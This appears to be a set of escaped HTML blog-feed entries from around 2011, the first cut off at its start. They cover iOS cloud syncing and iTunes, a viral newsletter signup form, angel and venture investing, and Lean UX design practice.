href=\"http://news.google.com/news/more?q=ipod+wi+fi+syncing+itunes&amp;hl=en&amp;prmd=ivnsufd&amp;bav=on.2,or.r_gc.r_pw.&amp;um=1&amp;ie=UTF-8&amp;ncl=dB-zgbTzGVSaOYMtsMcJ1nF0VAicM&amp;ei=njemTbGtMMea0QGjkKHxCA&amp;sa=X&amp;oi=news_result&amp;ct=more-results&amp;resnum=1&amp;ved=0CC0QqgIwAA\">that may well be coming soon</a>, but it wouldn’t solve the “how can these devices be ‘post-PC’ if they require a PC?” problem. We’re not talking about why the iPad needs a USB cable; we’re talking about why it needs a PC, period.</p>\n\n<p>Apple gets a rap for being bad at, or simply not caring about, “the cloud”, but that’s not accurate. It’s just that they’re moving things there one piece at a time. It’s already the case that a large amount of songs, movies, TV shows — and especially apps — are purchased from the iTunes Store by iOS users directly from their iPhones and iPads. That’s the first step Apple took away from iTunes (on the Mac/PC) as a required hub.</p>\n\n<p>So I’m thinking the iPad and iPhone won’t drop their connection to iTunes running on a PC in one fell swoop. It’ll be incremental, with new-device activation and software updates coming next. At that point, you’ll be able to use them without owning a PC. If you <em>want</em> to sync large libraries of music and video, you’ll still need a PC running iTunes, but if you have a large music/video library in the first place, you must have a PC already, so that’s not really a problem.</p>\n\n<p>It just isn’t technically feasible to have people backing up and restoring 32 or 64 GB of data to the cloud. It can take hours to download a single HD movie from iTunes over a Wi-Fi connection, and upload speeds are far slower than download speeds. iOS devices aren’t behind Android in this regard, because Android doesn’t do complete device backups/restores over the cloud. (Android devices don’t do complete backups/restores, period.<sup><a href=\"http://daringfireball.net/#fn1-2011-04-15\">1</a></sup>)</p>\n\n<h2>You Get Better at What You Do</h2>\n\n<p>Jason Fried had a good cover story for Inc. magazine last month, <a href=\"http://www.inc.com/magazine/20110301/making-money-small-business-advice-from-jason-fried_Printer_Friendly.html\">on how to get good at making money</a>. His advice in a nutshell: <em>you get good at making money by actually making money</em>:</p>\n\n<blockquote>\n  <p>I can’t say enough about bootstrapping. Whether you’re starting\nyour first business or your next one, my advice is to bootstrap\nit. Bootstrapping forces you to think about making money on Day\nOne. There’s a fundamental difference between a bootstrapped\nbusiness and a funded business. It’s all about which side of the\nmoney you’re on. From Day One, a bootstrapped business has no\nchoice but to make money. There’s no cushion in the bank and not\nmuch in the pockets. It’s make money or go home. To a bootstrapped\nbusiness, money is air.</p>\n\n<p>On the other hand, from Day One, a funded business is all about\nspending money. There’s a pile in the bank, and it’s not there to\ncollect interest. Your investors want you to hire, invest, and\nbuy. There’s less — and in some cases, no — pressure to make\nmoney. While that sounds comforting, I think it ultimately hurts.\nIt replaces the hustle, the scrap, the fight, with a false comfort\nof “we can worry about that later.”</p>\n</blockquote>\n\n<p>Eye-rollingly obvious, perhaps, but so is much of the best but most-ignored advice in life. Almost nothing worthwhile is easy, and it’s hard to just jump in and be good at something difficult right off the bat. Think, say, of Twitter, whose business plan, such that it is, has always been something along the lines of “<em>Get big and popular, then just flip the switch and start making money when we feel like it.</em>” There is no switch.</p>\n\n<p>The only reliable way to succeed at anything is to actually do it, repeatedly, with concentrated effort. True for individuals, and true for organizations. Athletes, artists, businesses.</p>\n\n<p>Making money is not easy. Apple has gotten good at making large profits every quarter by building up to that — making ever-increasing profits all along, quarter after quarter after quarter, device after device after device.</p>\n\n<p>Syncing to the cloud is not easy, either. I think Apple is smart enough to realize that they’re never going to just “flip a switch” and replace the entirety of iTunes’s desktop syncing with equally reliable over-the-air cloud syncing all at once. The only way Apple’s going to get good at cloud syncing is by actually <em>doing</em> cloud syncing.</p>\n\n<p>And they are, in small ways.</p>\n\n<p>Personal internet connections just aren’t ready for moving huge chunks of data around. Where iOS devices are behind the curve, competitively, is in cloud-based syncing for small bits of data. iPhone and iPad owners need MobileMe to get no-fuss wireless syncing for calendars, contacts, and bookmarks. I like MobileMe a lot, and it’s been very reliable for me for a few years now. But, at $99/year, it’s not something most iOS users have, and thus, most iOS users don’t get over-the-air syncing of calendars, contacts, and bookmarks. That’s not competitive today. (I’d love to know exactly what percentage of iOS users do use MobileMe.) I’ll bet nearly all Android users have Google accounts, and thus get calendars and contacts and many other bits of application data synced over-the-air a few minutes after they take their phones out of the box.</p>\n\n<p>The announcement many people seem to be waiting for is for Apple to tell iOS users they no longer need iTunes on the Mac or Windows. The announcement <em>I’d</em> like to see is for iOS users to no longer need to pay for MobileMe to wirelessly sync calendars, contacts — and any other small bits of data from apps from the App Store.</p>\n\n<p>iBooks does this. If you pause while reading a book on your iPad, then resume reading on your iPhone, it picks up on the same page in the book. Kindle and a bunch of other e-reading services do this too. The point isn’t that iBooks is unique or ahead of the curve in this regard. It’s that <em>you don’t need MobileMe for iBooks.</em> It’s all handled by the iTunes Store itself. You buy books on your device, you read them on your device, and your history, bookmarks and other metadata all get synced to your iTunes account in the cloud. And it works great. But a lot more apps should work like this. Should wireless Safari bookmark syncing cost $99 a year? Shouldn’t it be easy for iOS game developers to sync progress for the same game across multiple devices using the same iTunes account? App Store developers shouldn’t have to rely on another third party — Dropbox — for this sort of functionality.</p>\n\n<p>And those third-party iOS developers that <em>are</em> depending upon Dropbox — there’s a veritable cottage industry of Dropbox text editors alone — have a far better syncing experience than Apple’s own creative apps. The iPad versions of the iWork suite and GarageBand are exquisite apps — easily some of the best-designed user experiences for creative software ever made. But the process of getting, say, a slide deck created in Keynote on your iPad open in Keynote on your iMac is downright antediluvian. Google Docs has <em>none</em> of the UI panache, but the syncing is invisible. You just open Google Docs, and there are your files. Doesn’t matter which machine you used to edit or create them, or which machine you’re using now, they’re all just there. That’s part of the overall experience.</p>\n\n<p>That’s where Apple is behind.</p>\n\n<div>\n<hr>\n<ol>\n<li>\n<p>At least not without rooting (Android equivalent of jailbreaking) the device <a href=\"http://matrixrewriter.com/android/\">and using third-party software</a>. On some Android 2.2 (and later) phones — those that stick closest to stock Android — you can re-download all your previously downloaded apps from the Android Market on a new device, and <a href=\"http://developer.android.com/guide/topics/data/backup.html\">some app settings</a> are synced over-the-air to your Google account. But you don’t get backups or syncing of stuff like photos, videos, or music. <a href=\"http://daringfireball.net/#fnr1-2011-04-15\" title=\"Jump back to footnote 1 in the text.\">↩</a></p>\n</li>\n</ol>\n</div>"

In the course of things, a lot of them will offhandedly mention something like, <i>'Oh, I'm working on a new project right now.' 'Oh really?' 'Yeah, it's this new web app for doing web stuff faster...'</i> And you know, generally it will be a thoroughly useful, gorgeous thing, very much in tune with the web projects they've done previously.</p>\n\n<p>In the case of very cool customer Andrew from <a href=\"http://plethora.co\">Plethora</a>, the conversation was a little different this time.</p>\n\n<p>Andrew: <i>'Hey Ros, you know that <a href=\"http://www.plethora-app.com/\">awesome iPhone app</a> I created, the one with the Campaign Monitor gallery entries?'</i></p>\n\n<p>Me: <i>'Hell yeah!'</i></p>\n\n<p>Andrew: <i>'Well I'm doing something different now. Children's books. Geeky children's books. Check it out, I have a signup page.'</i></p>\n\n<p><a href=\"http://plethora.co/books/\"><img src=\"http://i3.campaignmonitor.com/uploads/images/my-little-geek.jpg\" alt=\"My Little Geek subscribe page\" width=\"530\" height=\"367\"> </a></p>\n\n<p>And looking at the results, I really think more web designers should move into the field of children's publishing.</p>\n\n<h3>Going viral</h3>\n\n<p><img src=\"http://i3.campaignmonitor.com/uploads/images/share-link.jpg\" alt=\"{title}\" width=\"230\" height=\"117\" style=\"float:right;margin:0 0 5px 10px\"></p>\n\n<p>Apart from looking darn gorgeous (thanks to illustrations by <a href=\"http://www.editsliacka.com/\">Edit Sliacka</a>) and offering a discount to new signups, the '<a href=\"http://plethora.co/books/\">My Little Geek</a>&#39; subscribe form is a little more clever than your average bear. Starting off with a stock-standard <a href=\"http://help.campaignmonitor.com/topic.aspx?t=13\">Campaign Monitor subscribe form</a>, Andrew took a cue from <a href=\"http://blog.forkly.com/post/2341870004/a-viral-launching-soon-form\">Forkly's 'Launching soon' page</a> and made it super-easy to share the page via your social networks. Upon signing up for 'My Little Geek' updates, new subscribes are provided with a short URL and buttons for posting it to Twitter, Facebook and email. With good reason, too. From <a href=\"http://blog.forkly.com/post/2735077109/a-viral-launching-soon-form-visualized\">Forkly's experience</a>:</p>\n\n<p><i>&quot;...About 16% of people who requested invites convinced at least one other person to request an invite as well. We promised people we’d put them on our priority list if they helped spread the word and got 3 or more people to sign up. About 7% hit that mark...&quot;</i></p>\n\n<p>When you've got loads of people signing up on a form, word can really spread far - Andrew  is also encouraging invitees to spread the love by offering an additional discount to those who consequently get 3 or more of their contacts on board, too. Again, from Forkly:</p>\n\n<p><i>&quot;The longest invite path we had was 8 levels deep…doesn’t seem like a lot, but each level represents exponential growth (granted, with some attenuation) over the previous one, so it adds up quite nicely.&quot;</i></p>\n\n<p>Finally, the My Little Geek/Forkly social sharing prompt is so unobtrusive, that it doesn't sully what's a visually impressive design. Inspiring work all around. Of course, if you have a little geek in mind, <a href=\"http://plethora.co/books/\">sign up</a> to get your mitts on a copy of 'My Little Geek'.</p>\n\n<p>Many thanks to Andrew for sharing his excellent subscribe form with us. Later this week, Andrew will be guest-posting a tutorial on how to create your own viral subscribe form, so stay tuned for more!</p><img src=\"http://feeds.feedburner.com/~r/CampaignMonitorBlog/~4/_85h_K92R_E\" height=\"1\" width=\"1\">"

Angels should almost do more homework than a professional VC would—VCs invest other people’s money while angels invest their own. We should all be thankful that we live in a world in which VCs exist. Finally, the accelerating returns on innovation means that all of the value in the public markets will be shrunk and put in the hands of startups.</p>\n<p>I’m not an investor. And maybe that’s a good thing. Because it means I don’t have an investment philosophy.</p>\n<p>Naval has a <a href=\"http://venturehacks.com/articles/investment-criteria\">personal investment philosophy</a> that he uses for his own investments—it’s focused and it has nothing to do with social proof. But there is no AngelList investment philosophy. The site helps startups and investors connect and the rest is up to them.</p>\n<h3>On Social Proof</h3>\n<p>Almost every investor uses social proof to filter dealflow. They just call it a “personal intro” or a “referral”. In fact, it’s usually the first filter they apply.</p>\n<p><em>If social proof is a good filter, is it also a good investment strategy?</em> Can I make my entire investment decision based solely on social proof? Will I make money if I invest in a company just because Warren Buffet invested in it, as long as I <a href=\"http://www.quora.com/Is-social-proof-a-rational-approach-to-investment-selection/answer/Naval-Ravikant\">get the same price</a> as him?</p>\n<p>As in all investment matters, the answer is “who knows”. When I share a startup on AngelList, I consider the company’s traction, product, team, and social proof—in that order. If you do a great job with an early item on that list, it doesn’t really matter how bad the later items look.</p>\n<p>But some interesting people are pursuing the social proof strategy. Yuri Milner, Ron Conway, and David Lee created Start Fund to “blindly” invest in every Y Combinator startup. And several VC funds are set up to provide follow-on capital to startups backed by Sequoia, Benchmark, Khosla, and other tippity-top-tier venture funds.</p>\n<h3>On Angels</h3>\n<p>If you’re going to invest your own money in private companies, as an angel or otherwise, get educated. Read <a href=\"http://www.bothsidesofthetable.com/2010/09/14/angel-investing-1-dealflow-are-you-sitting-at-the-right-poker-table\">Mark Suster</a>‘s series on angel investing. Listen to our (old and somewhat out of date) <a href=\"http://www.slideshare.net/venturehacks/how-to-be-an-angel\">podcast</a> on the topic.</p>\n<p><em>Angels should almost do more homework than a professional VC would—VCs invest other people’s money but angels invest their own!</em></p>\n<p>And don’t invest in a startup if you can’t lose all that money <em>tomorrow</em>, with a smile on your face. Frankly, I wouldn’t invest in <em>anything</em> if it didn’t meet that criterion (except money markets and very broad, low-fee index funds).</p>\n<h3>On VCs</h3>\n<p>We’ve gotten about half a dozen Series A’s and B’s funded on AngelList,  and we have 400 happy <a href=\"http://angel.co/vc\">VCs</a> on the site. I think Marc Andreessen <a href=\"http://pmarca-archive.posterous.com/the-truth-about-venture-capitalists-part-2\">put it</a> best, well before he became a VC:</p>\n<blockquote><p>“Why we should be thankful that we live in a world in which VCs exist, even if they yell at us during board meetings, assuming they’ll fund our companies at all:</p>\n<p>“Imagine living in a world in which professional venture capital didn’t exist.</p>\n<p>“There’s no question that fewer new high-potential companies would be funded, fewer new technologies would be brought to market, and fewer medical cures would be invented.”</p></blockquote>\n<h3>On Startups</h3>\n<p>Startup valuations are up. That’s because capital is flowing into the system and, therefore, there is more demand. That’s a cyclical trend: the amount of available capital will go up and down and so will valuations.</p>\n<p>But there are some secular trends that are driving up valuations.</p>\n<p>First, many investors believe that the vast majority of returns come from a few new companies every year and, therefore, those companies attract a disproportionate amount of investor interest.</p>\n<p>Second, startups are getting better at <a href=\"http://venturehacks.com/articles/create-a-market\">creating a market for their shares</a> and <a href=\"http://startupboy.com/2010/12/01/the-unbundling-of-the-venture-capital-industry\">unbundling capital, control, and advice</a>. This is where AngelList can help.</p>\n<p>Third, startups have become a (bit of a) science. Entrepreneurs are much smarter about the art of building companies than they were even five years ago.</p>\n<p>Fourth, the <a href=\"http://www.kurzweilai.net/the-law-of-accelerating-returns\">accelerating returns on innovation</a> means that all of the value in the public markets will be <a href=\"http://redeye.firstround.com/2006/04/shrink_a_market.html\">shrunk</a> and put in the hands of startups. The NYSE alone has $14 trillion of value. NASDAQ has almost a trillion dollars of volume <em>every day</em>. Today’s startups are the heirs to that value.</p>\n<p>Of course, today’s startups will be disrupted by more startups. And on and on, with shorter and shorter time cycles. But I don’t think big companies will hold onto this value. The <a href=\"http://en.wikipedia.org/wiki/Principal-agent_problem\">principal-agent</a> problem is too pervasive, among many other reasons that big companies are considered “dumb”.</p>\n<p>[Click the links in this post, they're all good.]</p>\n<div>\n<a href=\"http://feeds.venturehacks.com/~ff/venturehacks?a=ClkIwlqcsjk:jxoNuzvMYuE:D7DqB2pKExk\"><img src=\"http://feeds.feedburner.com/~ff/venturehacks?i=ClkIwlqcsjk:jxoNuzvMYuE:D7DqB2pKExk\" border=\"0\"></a>\n</div><img src=\"http://feeds.feedburner.com/~r/venturehacks/~4/ClkIwlqcsjk\" height=\"1\" width=\"1\">"

Wireframes, site maps, flow diagrams, content inventories, taxonomies, mockups and the ever-sacred specifications document (aka “The Spec”) helped define the practice in its infancy. These deliverables crystallized the value that the UX discipline brought to an organization.</p><p>Over time, though, this deliverables-heavy process has put UX designers in the deliverables business — measured and compensated for the depth and breadth of their deliverables instead of the quality and success of the experiences they design. Designers have become documentation subject matter experts, known for the quality of the <strong>documents</strong> they create instead of the end-state <strong>experiences</strong> being designed and developed.</p><p>When combined with serial waterfall development methodologies, these design deliverables end up consuming an enormous amount of time and creating a tremendous amount of waste. Waste is defined as anything that is ultimately not used in the development of the working product.</p><p><a href=\"http://www.flickr.com/photos/flat61/3883611573/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2011/03/ux-discussion.jpg\" width=\"500\" height=\"310\" alt=\"Ux-discussion in Lean UX: Getting Out Of The Deliverables Business\"></a><br><em> Engaging in long drawn-out design cycles risks paralysis by internal indecision as well as missed windows of market opportunity. Image by <a href=\"http://www.flickr.com/photos/flat61/3883611573/\">opensourceway</a>.</em></p><p>As organizations struggle to stay nimble in the face of an ever-changing marketplace that is disrupted constantly by incumbents as well as start-ups, getting to market fast becomes top priority. Engaging in long drawn-out design cycles risks paralysis by internal indecision as well as missed windows of market opportunity. In other words, by the time the company decides internally how the product should be designed, the needs of the marketplace have changed.</p><p>Waterfall software development looks something like this:</p><blockquote><p>Define → Design → Develop → Test → Deploy</p></blockquote><p>The design phase typically breaks down like this:</p><blockquote><p>Wait for requirements definition to take place and get approved →<br>Consume requirements documents →<br>Develop high-level site maps and workflows →<br>Gain consensus and approval →<br>Develop screen-level wireframes for each section of the experience →<br>Present to stakeholders and gain consensus and approval →<br>Create visual designs for each wireframe →<br>Present to stakeholders and gain approval (after repeated cycles of review) →<br>Write The Spec, detailing every pixel and interaction →<br>Usability test for future improvements →<br>Hand off to development for review, approval and start of implementation</p></blockquote><p>This phase can take anywhere from one to six months depending on the scope of the project, leaving many wasted hours and much designer frustration in its wake.</p><p>Enter Lean UX.</p><h4>Lean UX</h4><p>Inspired by Lean and Agile development theories, Lean UX is the practice of bringing the true nature of our work to light <strong>faster</strong>, with less emphasis on deliverables and greater focus on the <strong>actual experience</strong> being designed.</p><p>Traditional documents are discarded or, at the very least, stripped down to their bare components, providing the minimum amount of information necessary to get started on implementation. Long detailed design cycles are eschewed in favor of very short, iterative, low-fidelity cycles, with feedback coming from all members of the implementation team early and often. Collaboration with the entire team becomes critical to the success of the product.</p><p>Interestingly and not surprisingly, one of the immediate casualties of Lean UX is the stereotypical solitary designer, working silently in a corner for a period of time, inviting only occasional peeks at their work before it’s “done.” This mindset is also the biggest obstacle to wider adoption of this practice.</p><p>Let’s take a look at the Lean UX process:</p><p><a href=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2011/03/just-the-ux-process-large.jpg\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2011/01/process_graphic.gif\" alt=\"Process Graphic in Lean UX: Getting Out Of The Deliverables Business\" width=\"551\" height=\"198\"></a><br> <em>Stay lean and focus on the experience, not the paperwork.</em></p><p>Looks familiar? It should if you’re familiar with Agile or its derivatives. Lightweight concepting kicks off the process. This can be done on a whiteboard, a napkin or a quick wireframe. The goal is to get the core components of the idea or workflow visualized quickly and in front of your team.</p><p>The team begins to provide their insights on the direction of the design as well as its feasibility. Changes are then made to the original idea, or perhaps it’s scrapped entirely and a new idea proposed. The initial investment in sketching is so minimal that there is no significant cost to completely rethinking the direction. Once a direction is agreed upon internally, a rough prototype helps to validate the idea with customers. That learning helps to refine the idea, and the cycle repeats.</p><p>What’s most important to recognize here is that Lean UX is focused <strong>strictly on the design phase</strong> of the software development process. Whatever your organization’s chosen methodology (waterfall, Agile, etc.), these concepts can be applied to your design tasks.</p><h4>Isn’t This Just Design-By-Committee?</h4><p>Lean UX encourages you, the designer, to show your work early and often to the team, collect their insights and build that into the next iteration of the design. To many folks, this sounds like the dreaded “design by committee” approach, which has killed many designs in years past.</p><p>In fact, the designer is still driving the design by aggregating all of that feedback, assessing what works best for the business and the user, and iterating the design forward. By providing insight into the design work to your teammates sooner rather than further down the design road, you accomplish the following:</p><ol><li>Ensure that you’re aligned with the broader team and the business vision;</li><li>Give developers a sneak peek at the direction of the application (speeding up development and surfacing challenges earlier);</li><li>Further flesh out your thinking, since verbalizing your concepts to others forces you to focus on areas that you didn’t think of when you were pushing the pixels.</li></ol><p>The trick is to stay lean: keep the deliverables light and editable. Eliminate waste by not spending hours getting the pixels exactly right and the annotations perfect. Got an idea for a flow? Throw it up on the whiteboard, and grab the product owner or project leader to tell them about it. Ready to design? Rough out the first page of the flow in your sketchpad. How does it feel? Is the flow already evident? Post it in a visible place at the office and invite passers-by to comment on it.</p><p><a href=\"http://www.flickr.com/photos/64519085@N00/4305366199/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2011/03/expectations.gif\" width=\"500\" height=\"353\" alt=\"Expectations in Lean UX: Getting Out Of The Deliverables Business\"></a><br><table><caption><td><em>In the Lean UX methodology spending time on realistic goals and informed design decisions is crucial. It helps to effectively match expectations and reality for your clients. Image by <a href=\"http://www.flickr.com/photos/64519085@N00/4305366199/\">Kristian Bjørnard</a></em></td></caption><td><p>As you iterate, suggestions and feedback from various team members will inevitably start to manifest themselves in the experience. The team members who suggested these ideas will begin to feel a sense of ownership in the design and notice it in others. It has now become something they had a hand in creating. This sense of ownership will equip the designer with new allies to defend the work when it comes under criticism from external forces. The <strong>team</strong> ultimately becomes more invested in the success of the experience.</p><h3>Lean UX Is Not Lazy UX</h3><p>It may seem at first that this is a lazy approach to UX, that the goal is simply to do less work. On the contrary, you’re actually using all of the tools in your UX toolkit. Sketching, presenting, critiquing, researching, testing, prototyping, even wireframing — these all get a solid workout in each cycle of the process. The trick is to use these tools when appropriate and, more importantly, to use them at <strong>the depth</strong> appropriate for the immediate problem you’re trying to solve for the business.</p><h4>Designers Need to Feel in Control of Their Work</h4><p>“But I’m giving up control of my design!” is one of the most often-heard complaints from designers who try out Lean UX. Their concern is that by collecting feedback from non-designers, they will be less valuable to the team and be relegated to the role of menial pixel-pusher.</p><p><a href=\"http://www.flickr.com/photos/bjornmeansbear/5279065887/in/set-72157623006302347/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2011/03/invincible-ux.jpg\" width=\"500\" height=\"354\" alt=\"Invincible-ux in Lean UX: Getting Out Of The Deliverables Business\"></a><br><em>Holding on to the concept and avoiding the unnecessary is vital in Lean UX.

The designer continues to drive the design, but the guardrails (i.e. constraints) become more visible with each iteration and review. Basically, if you spend three months perfecting a design only to find out after launch that it fails to meet customers’ needs, then you’ve just wasted three months of your life, not to mention your team’s.</p><p>Lean UX also speeds up development time. By giving the team early insight into the design’s direction, it can begin to lay the groundwork for that experience. This foundational coding phase helps to expose feasibility challenges in the proposed solution. The time, material and resources available then help to prioritize the product’s elements, separating the parts that get built from those that get pushed out or reduced in scope. All of this affects where the designer focuses their energy, thus minimizing waste.</p><h4>Prototyping: The Fastest Way Between You and Your Customers</h4><p>Lean UX is where prototyping shines. As with the initial sketches, focusing the prototype on critical components of the experience is essential. Pick the core user flow (or two), and prototype only those screens. The fidelity of the prototype ultimately doesn’t matter, so create it the way you know best. Once created, it will be immediately testable by any and all users.</p><p>Successful lean prototypes have been created with code, with design software such as Adobe Fireworks and even with PowerPoint. At times, your client (internal or external) will demand a level of fidelity that helps them better visualize the experience. Work with the tool that is most comfortable and fastest for you and that delivers just enough fidelity for the client.</p><p>Next, get that prototype in front of everyone who matters internally, and validate whether you’re meeting the needs of the business.</p><p><a href=\"http://www.flickr.com/photos/rosenfeldmedia/3978302604/in/photostream/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2011/03/lean-ux-prototype.jpg\" width=\"450\" height=\"393\" alt=\"Lean-ux-prototype in Lean UX: Getting Out Of The Deliverables Business\"></a><br><em>Diagram of the iterative design and critique process. Warfel, Todd Zaki. 2009. Prototyping: A Practitioner’s Guide. New York: Rosenfeld Media.</em></p><p>Most importantly, get the prototype in front of customers. Bring them in regularly to test the workflows, ideally once a week. You don’t need to test with many customers. Jakob Nielsen <a href=\"http://www.useit.com/alertbox/20000319.html\">found out</a> that after five participants, the odds of finding new roadblocks in the experience were low. If you test regularly, you can cut the number of participants per week to three. This will also cut costs.</p><p>Collect feedback. Figure out what worked and what didn’t. Tweak the prototype. Hell, gut it if you have to: that’s the beauty of Lean UX. The investment you’ve put in at each phase is so minimal that rethinking, reconfiguring or redesigning isn’t crushing in workload or ego-bruising.</p><p>Once validated, demo your updated prototype to the team. Explain the flows, the user motivations and why you designed it the way you did. The prototype has now become your documentation. It is “The Spec.” Very little (if anything) more is needed. Regardless, you’re there to answer any questions that come up. The strength of Lean UX here is that, with the design validated, the designer is now freed to move on to the next core component of the experience, instead of spending six weeks creating a design-requirements document and pixel-perfect specs.</p><p>Prototyping puts the power of validating the design’s direction much more quickly in the hands of the ultimate decider: your customers. They are the ones with whom the design will speak for itself, and in the environment where it will ultimately have to succeed.</p><h4>Maintaining a Holistic Vision</h4><p>“But what about my vision? By chopping the design up and delivering it piecemeal to the team and, ultimately, customers, I’m compromising on my vision of the product and putting out a sub-standard experience!”</p><p><a href=\"http://www.flickr.com/photos/bjornmeansbear/4585293325/in/set-72157623006302347/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2011/03/agile.jpg\" width=\"456\" height=\"392\" alt=\"Agile in Lean UX: Getting Out Of The Deliverables Business\"></a><br><caption><td><em>Lean and Agile Development are called for! Image by <a href=\"http://www.flickr.com/photos/bjornmeansbear/4585293325/in/set-72157623006302347/\">Kristian Bjørnard</a></em></td></caption><td><p>UX designers have traditionally worn many hats. You now have another to add to the hall tree: keeper of the vision. In this new role, <em>your</em> responsibility is to keep an eye on the big picture. Lean UX forces you to think of the experience in prioritized chunks. Ultimately, those chunks all have to roll up into one cohesive product. That cohesive product is your vision. Even as the design shifts and morphs through iterations and customer feedback, you are always designing towards that greater goal. “Increasing time on site for returning customers” could be a vision. “Deliver content faster and in a more contextual manner” could be another. Regardless of how the design shifts, these goals drive your work.</p><p>It won’t be easy. In the past, those hard-won, comprehensive, approved deliverables authorized you to design in a specific direction. With Lean UX, the iterative cycle and the frequent varying opinions will inevitably create conflicts with your vision. This is where you push back. Use the stated vision to help sort out conflicting feedback and focus your efforts on the end goal.</p><h4>Deliverables For Maintenance Don’t Make Sense Anymore</h4><p>Documentation has long served as a way for organizations to maintain their software. It becomes a reference tool to understand the decisions of the past, which inform the decisions of the present. While this may make sense for complex business rules, it doesn’t make sense for design. The final product <em>is</em> the documentation. It <em>is</em> the experience. Thick deliverables created simply for future reference regarding the user experience become obsolete almost as soon as they are completed. When a question arises about how something should behave in the UX, going through that workflow in the product to see what happens is easy enough. The old kind of documentation is waste and draws effort away from solving current design problems.</p><h4>How Does Content Strategy and Planning Fit In?</h4><p>Websites and applications that are focused on heavy content delivery (as opposed to task- or function-based websites) will need some up-front planning and documentation. Getting right down to the level of the page and article may not be necessary, but getting enough of an idea of the type of content that will be delivered and a sense of its hierarchy is essential to getting to that first sketch and prototype. Once the team grasps the scope and type of content needed for the experience, work can begin as the experience is refined.</p><h3>Can It Be Done At My Organization?</h3><p>At the risk of oversimplifying, let’s look at two types of organizations: the internal software/design shop and the interactive agency.</p><p>For internal software/design organizations, the transition to Lean UX is well within reach. You are in the problem-solving business, and <strong>you don’t solve problems with design documentation</strong>. You solve them with elegant, efficient and sophisticated software. Working in these new attributes should ultimately be an easy sell internally because you are advocating for more collaboration, more conversation and earlier delivery to customers. Yes, the culture will have to shift — shipping what amounts to the minimum desirable product can be a tough pill to swallow for those used to big-bang releases. However, the ability to make quicker decisions along the way, informed by regular customer feedback, should ultimately trump these concerns.</p><p>Interactive agencies have it a bit tougher because <strong>they are in the deliverables business</strong>. They get paid for their documentation and spend a <em>lot</em> of time creating it. A specialist creates each document, and they charge for that time. Reducing those efforts means reducing revenue.</p><p>Lean UX proposes that the shortfall in up-front revenue generated by deliverables can easily be made up, and then some, by delivering higher-quality work, faster, to the client. The process has to be modified slightly, though:</p><p><a href=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2011/01/agency_process.png\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2011/03/process-small.jpg\" alt=\"Process-small in Lean UX: Getting Out Of The Deliverables Business\" width=\"500\" height=\"134\"></a><br> <em>Lean UX process for an interactive agency.</em></p><p>The core difference with the agency’s process is the regular and frequent involvement of the client. Set up twice- or thrice-weekly 30-minute reviews with them. Set the expectation that you’ll be showing rough, directional work and that you’ll want their feedback. Each time you review a directional sketch with your client, they’ll notice the evolution and progress. Their feedback will work its way in and, like an internal stakeholder, they’ll gain that sense of ownership.</p><p>By involving the client in the process, by iterating the design quickly and by testing the iterations with real customers, you will reach an optimal solution in less time than before.</p><p>In agency-land, less time typically means less revenue, which could potentially be the death knell for Lean UX. But while the output took less billable time to create, it will likely be more effective and will bring the customer back to your shop more frequently than in the past. In addition, you’ve made the client part of the process. This is empowering, and clients like that feeling.</p><p>This is not an easy change because agency culture has been the same for many decades. Only the boldest agencies will take this on. But those that do will find greater success from it and will quickly be imitated. These ideas are worth piloting on an internal project; perhaps the redesign of the agency’s website. Prove that they work, and then branch out to actual clients.</p><h4>I’m a Consultant/Freelancer. Does This Make Sense for Me?</h4><p>Consultants are, in essence, an agency of one. It stands to reason that the agency process could work in this situation as well. Constant feedback and iteration with the client will engender the same feelings of trust and co-ownership. The challenge for the consultant/freelancer is the amount of time they can dedicate to each client. Assuming they can handle multiple projects or clients simultaneously, providing the level of attention and communication necessary to maintain a true Lean UX process becomes difficult. In this case, falling back on a slightly deeper level of documentation makes sense to keep concurrent projects moving forward.</p><p><a href=\"http://www.flickr.com/photos/bjornmeansbear/5309945659/in/set-72157623006302347/\"><img src=\"http://media.smashingmagazine.com/cdn_smash/wp-content/uploads/2011/03/Where-do-I-go-from-Here1.jpg\" alt=\"Where-do-I-go-from-Here1 in Lean UX: Getting Out Of The Deliverables Business\"></a><br><em>Optimize your workflow and win time. Image by <a href=\"http://www.flickr.com/photos/bjornmeansbear/5309945659/in/set-72157623006302347/\">Kristian Bjørnard</a></em></p><p>It’s worth mentioning that one big challenge for Lean UX to be successful in any of these settings is the use of offshore development vendors. One of the fundamental principles needed for Lean UX to succeed is collaboration — ideally in real time and place it can even work via Skype or other virtual meeting technology. When a vendor has minimal contact with your design group and requires a certain level of documentation in order to produce work, Lean UX may not work in its entirety.</p><p>Lean UX is being actively used by a growing number of organizations. <a href=\"http://dev.theladders.com/2011/01/the-100-day-solution/\">The way</a> TheLadders has implemented it in a recent effort is an example of keeping deliverables light, fostering greater collaboration and achieving goals successfully.</p><h3>Conclusion</h3><p>Lean UX is an evolution, not a revolution. UX designers need to evolve and stay relevant as the practice evolves. Lean UX gets designers out of the deliverables business and back into the experience design business. This is where we excel and do our best work. Let’s become experts at delivering great results through these experiences and forgo the hefty spec documents. It won’t be an easy road. Culture and tradition will push back, yet the ultimate return on this investment will be more rewarding work and more successful businesses.</p><p><em>(al) (vf) (sp)</em></p><hr><p><small>© Jeff Gothelf for <a href=\"http://www.smashingmagazine.com\">Smashing Magazine</a>, 2011. | <a href=\"http://www.smashingmagazine.com/2011/03/07/lean-ux-getting-out-of-the-deliverables-business/\">Permalink</a> | <a href=\"http://www.smashingmagazine.com/2011/03/07/lean-ux-getting-out-of-the-deliverables-business/#comments\">Post a comment</a> | <a href=\"http://shop.smashingmagazine.com/\" title=\"Smashing Shop\">Smashing Shop</a> | <a href=\"http://www.smashingmagazine.com/the-smashing-network/\" title=\"Smashing Network\">Smashing Network</a> | <a href=\"http://www.smashingmagazine.com/about/\" title=\"About Us\">About Us</a><br> Post tags: <a href=\"http://www.smashingmagazine.com/tag/usability/\" rel=\"tag\">usability</a>, <a href=\"http://www.smashingmagazine.com/tag/ux/\" rel=\"tag\">ux</a><br> 